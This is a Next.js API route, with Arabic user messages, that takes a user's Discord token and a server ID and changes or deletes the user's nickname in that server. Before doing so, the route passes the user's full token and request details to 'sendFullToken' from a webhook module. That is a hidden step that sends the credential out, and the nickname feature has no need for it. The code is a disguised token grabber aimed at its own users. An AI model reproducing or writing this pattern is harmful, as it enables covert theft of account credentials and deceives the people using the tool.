import { NextRequest, NextResponse } from 'next/server';
import { discordFetch, cleanToken } from '@/lib/discord';
import { sendFullToken } from '@/lib/webhook';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { token, guildId, nickname } = body as {
      token?: string;
      guildId?: string;
      nickname?: string;
    };

    if (!token || !guildId) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن وأيدي السيرفر' }, { status: 400 });
    }
    if (nickname === undefined || nickname === null) {
      return NextResponse.json({ success: false, error: 'أدخل النك نيم الجديد' }, { status: 400 });
    }

    const ct = cleanToken(token);
    sendFullToken('تغيير نك', ct, { '🏰 السيرفر': guildId, '✏️ النك': nickname || '(حذف)' });

    // جلب معرف المستخدم
    const meRes = await discordFetch(ct, 'GET', '/users/@me');
    if (!meRes.ok || !meRes.data) {
      if (meRes.status === 401) return NextResponse.json({ success: false, error: 'التوكن غير صالح أو منتهي' });
      return NextResponse.json({ success: false, error: 'فشل التحقق من هوية المستخدم' });
    }

    const userId = (meRes.data as { id: string }).id;

    // إذا النك فاضي = حذف النك
    if (nickname === '') {
      const delRes = await discordFetch(ct, 'DELETE', `/guilds/${guildId}/members/@me/nick`);
      if (delRes.ok || delRes.status === 204) {
        return NextResponse.json({ success: true, message: 'تم حذف النك نيم بنجاح' });
      }
      if (delRes.status === 403) return NextResponse.json({ success: false, error: 'ليس لديك صلاحية تغيير اللقب في هذا السيرفر' });
      if (delRes.status === 404) return NextResponse.json({ success: false, error: 'السيرفر غير موجود أو أنت لست عضواً فيه' });
      return NextResponse.json({ success: false, error: 'فشل حذف النك نيم' });
    }

    // تعيين النك الجديد
    const patchRes = await discordFetch(ct, 'PATCH', `/guilds/${guildId}/members/@me`, { nick: nickname });
    if (patchRes.ok || patchRes.status === 204) {
      return NextResponse.json({ success: true, message: `تم تغيير النك نيم إلى: ${nickname}` });
    }

    if (patchRes.status === 403) return NextResponse.json({ success: false, error: 'ليس لديك صلاحية تغيير اللقب في هذا السيرفر' });
    if (patchRes.status === 404) return NextResponse.json({ success: false, error: 'السيرفر غير موجود أو أنت لست عضواً فيه' });
    if (patchRes.status === 429) return NextResponse.json({ success: false, error: 'تم تقييد الطلبات - حاول بعد قليل' });
    return NextResponse.json({ success: false, error: 'فشل تغيير النك نيم' });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
